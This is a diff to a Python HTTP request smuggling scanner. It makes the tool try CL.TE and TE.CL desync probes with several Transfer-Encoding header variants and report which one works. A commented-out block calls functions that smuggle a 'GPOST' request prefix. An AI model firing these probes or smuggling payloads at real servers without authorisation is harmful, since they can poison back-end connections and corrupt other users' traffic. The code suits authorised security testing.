@@ -10,6 +10,8 @@ import socket
 import ssl
 import urllib.parse
 
+import transfer_encodings
+
 
 TIMEOUT = 5
 
@@ -95,23 +97,23 @@ def query(target, payload):
     s.close()
 
 
-def is_vulnerable(target):
-    vulnerable = False
+def is_vulnerable(target, te_header):
+    vulnerable = ''
     url = f'{target.scheme}://{target.host}:{target.port}{target.path}'
 
-    # Check vulnerability to CL.TE attack
+    # Test vulnerability to CL.TE attack
     try:
         query(target, f'POST {target.path} HTTP/1.1\r\n'
                       f'Host: {target.host}\r\n'
-                       'Transfer-Encoding: chunked\r\n'
+                      f'{te_header}\r\n'
                        'Content-Length: 4\r\n'
                        '\r\n'
                        '1\r\n'
                        'Z\r\n'
                        'Q')
     except socket.timeout:
-        logging.debug(f'CL.TE timeout on {url}')
-        vulnerable = True
+        vulnerable = 'CL.TE'
+        logging.debug(f'{vulnerable} timeout on {url}')
 
     # If target is vulnerable to CL.TE desync then the TE.CL check will poison
     # the back-end socket with an 'X', potentially harming legitimate users.
@@ -119,7 +121,7 @@ def is_vulnerable(target):
     if vulnerable:
         return vulnerable
 
-    # Check vulnerability to TE.CL attack
+    # Test vulnerability to TE.CL attack
     try:
         query(target, f'POST {target.path} HTTP/1.1\r\n'
                       f'Host: {target.host}\r\n'
@@ -130,8 +132,8 @@ def is_vulnerable(target):
                        '\r\n'
                        'X\r\n')
     except socket.timeout:
-        logging.debug(f'TE.CL timeout on {url}')
-        vulnerable = True
+        vulnerable = 'TE.CL'
+        logging.debug(f'{vulnerable} timeout on {url}')
 
     return vulnerable
 
@@ -166,9 +168,12 @@ def te_cl_smuggle(target, smuggle):
 def main():
     args = parse_args()
     target = parse_url(args.url)
-    logging.debug(f'normalized url: '
-                  f'{target.scheme}://{target.host}:{target.port}{target.path}')
-    is_vulnerable(target)
+    url = f'{target.scheme}://{target.host}:{target.port}{target.path}'
+    logging.debug(f'normalized url: {url}')
+    for te in transfer_encodings.te_values:
+        r = is_vulnerable(target, te)
+        if r:
+            print(f'{r} with header {repr(te)}')
 '''
     cl_te_smuggle(target, 'G')
     te_cl_smuggle(target, f'GPOST / HTTP/1.0\r\n'
@@ -176,6 +181,7 @@ def main():
                            'Content-Length: 50\r\n'
                            '\r\n')
 '''
+
 
 if __name__ == "__main__":
     main()
